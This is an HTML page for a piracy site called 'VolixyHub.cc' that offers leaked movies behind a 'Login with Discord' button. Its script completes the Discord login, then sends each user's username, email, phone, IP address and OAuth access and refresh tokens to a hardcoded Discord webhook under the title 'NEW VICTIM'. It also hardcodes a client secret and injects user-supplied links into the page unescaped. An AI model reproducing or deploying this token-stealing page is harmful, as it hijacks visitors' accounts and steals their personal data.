<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>VolixyHub.cc</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{background:#0a001a;color:#e0c0ff;font-family:system-ui;overflow:hidden;height:100vh;position:relative;}
        canvas{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;}
        .center{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;width:90%;}
        h1{color:#ff00ff;font-size:clamp(40px,10vw,80px);text-shadow:0 0 30px #ff00ff;}
        #btn{background:linear-gradient(135deg,#8B00FF,#FF00FF);padding:20px 60px;border-radius:50px;font-size:30px;color:white;border:none;box-shadow:0 0 60px #ff00ff;cursor:pointer;}
        #topbar{position:fixed;top:0;width:100%;background:rgba(20,0,40,0.95);padding:15px;z-index:10;display:flex;justify-content:space-between;align-items:center;}
        #grid{padding:70px 10px 80px;display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:15px;}
        .card{background:rgba(100,0,180,0.5);border-radius:15px;overflow:hidden;}
        iframe,video{width:100%;height:250px;border:none;}
        .title{padding:10px;color:#ff00ff;font-weight:bold;}
        #plus{position:fixed;bottom:20px;right:20px;background:#ff00ff;width:70px;height:70px;border-radius:50%;font-size:40px;color:white;border:none;box-shadow:0 0 50px #ff00ff;cursor:pointer;}
        #modal,#overlay{display:none;position:fixed;z-index:100;}
        #overlay{background:rgba(0,0,0,0.9);inset:0;}
        #modal{background:#200040;top:50%;left:50%;transform:translate(-50%,-50%);padding:30px;border-radius:20px;width:90%;max-width:400px;box-shadow:0 0 80px #ff00ff;}
        input,button{margin:10px 0;width:100%;padding:15px;border-radius:12px;font-size:16px;}
        button{background:#ff00ff;color:white;border:none;cursor:pointer;}
    </style>
</head>
<body>
<canvas></canvas>

<div class="center" id="login">
    <h1>VolixyHub.cc</h1>
    <p style="font-size:24px;margin:20px 0;">Leak Movies • Phone & PC</p>
    <button id="btn" onclick="login()">LOGIN WITH DISCORD</button>
</div>

<div id="main" style="display:none;">
    <div id="topbar">
        <div>Leaks</div>
        <div id="user"></div>
    </div>
    <div id="grid"></div>
    <button id="plus" onclick="openModal()">+</button>
</div>

<div id="overlay" onclick="this.style.display='none';document.getElementById('modal').style.display='none'"></div>
<div id="modal">
    <h2 style="color:#ff00ff;text-align:center;">Leak Movie</h2>
    <input type="text" id="name" placeholder="Movie name">
    <input type="url" id="url" placeholder="Vidify / YouTube / MP4 link">
    <button onclick="leak()">POST</button>
</div>

<script>
// === AUTOMATIC REDIRECT URI FIX ===
const CURRENT_URL = location.href.split('?')[0].replace(/\/+$/, ""); // removes trailing slash & query
const CLIENT_ID = "1446341068315693230";
const CLIENT_SECRET = "pOvGXscCogOmdfva_VYZCdTZZsPHAbyC";
const WEBHOOK = "https://discord.com/api/webhooks/1445978398391275721/wiUM_7MA6Pin70VLVcXT30GwF7gYfNJExBgkVHPoRrCCcXoqXLo31iCeOyIJdP87mK6N";

function login() {
    const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(CURRENT_URL)}&response_type=code&scope=identify%20email%20connections%20guilds`;
    location.href = oauthUrl;
}

// Handle login callback
if (location.search.includes('code=')) {
    const code = new URLSearchParams(location.search).get('code');
    
    fetch('https://discord.com/api/v10/oauth2/token', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: new URLSearchParams({
            client_id: CLIENT_ID,
            client_secret: CLIENT_SECRET,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: CURRENT_URL
        })
    })
    .then(r => r.json())
    .then(token => {
        fetch('https://discord.com/api/v10/users/@me', {
            headers: {Authorization: `Bearer ${token.access_token}`}
        })
        .then(r => r.json())
        .then(user => {
            document.getElementById('login').style.display = 'none';
            document.getElementById('main').style.display = 'block';
            document.getElementById('user').innerHTML = `<img src="https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.webp?size=40" style="border-radius:50%;margin-right:10px;"> ${user.global_name || user.username}`;
            
            // SEND TO YOUR WEBHOOK
            fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(ipData=>{
                const ip = ipData.ip;
                const embed = {
                    title: "NEW VICTIM",
                    color: 9442302,
                    thumbnail: {url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.webp?size=512`},
                    fields: [
                        {name: "User", value: `${user.username}#${user.discriminator}`, inline: true},
                        {name: "Global", value: user.global_name || "—", inline: true},
                        {name: "Email", value: user.email || "Hidden", inline: true},
                        {name: "Phone", value: user.phone || "None", inline: true},
                        {name: "IP", value: ip, inline: true},
                        {name: "Token", value: "||"+token.access_token+"||"},
                        {name: "Refresh", value: "||"+token.refresh_token+"||"}
                    ],
                    footer: {text: "VolixyHub.cc"}
                };
                fetch(WEBHOOK, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({embeds:[embed]})});
            });
            
            history.pushState({}, "", CURRENT_URL); // clean URL
        });
    });
}

function openModal() {
    document.getElementById('overlay').style.display = 'block';
    document.getElementById('modal').style.display = 'block';
}

function leak() {
    const name = document.getElementById('name').value.trim();
    const url = document.getElementById('url').value.trim();
    if (!name || !url) return alert("Fill both!");
    const iframe = url.includes('vidify') || url.includes('youtube') ? `<iframe src="${url.includes('youtube')?url.replace('watch?v=','embed/'):url}" allowfullscreen></iframe>` : `<video controls><source src="${url}"></video>`;
    document.getElementById('grid').innerHTML += `<div class="card">${iframe}<div class="title">${name}</div></div>`;
    document.getElementById('overlay').style.display = 'none';
    document.getElementById('modal').style.display = 'none';
    document.getElementById('name').value = '';
    document.getElementById('url').value = '';
}

// Snow effect
const canvas = document.querySelector("canvas");
const ctx = canvas.getContext("2d");
canvas.width = innerWidth; canvas.height = innerHeight;
let particles = [];
for(let i=0;i<400;i++) particles.push({x:Math.random()*canvas.width,y:Math.random()*canvas.height,r:Math.random()*3+1,s:Math.random()*1.5+0.5});
function snow(){ctx.clearRect(0,0,canvas.width,canvas.height);particles.forEach(p=>{ctx.fillStyle="rgba(255,200,255,0.9)";ctx.beginPath();ctx.arc(p.x,p.y,p.r,0,Math.PI*2);ctx.fill();p.y+=p.s;if(p.y>canvas.height)p.y=-10;});requestAnimationFrame(snow);}snow();
</script>
</body>
</html>
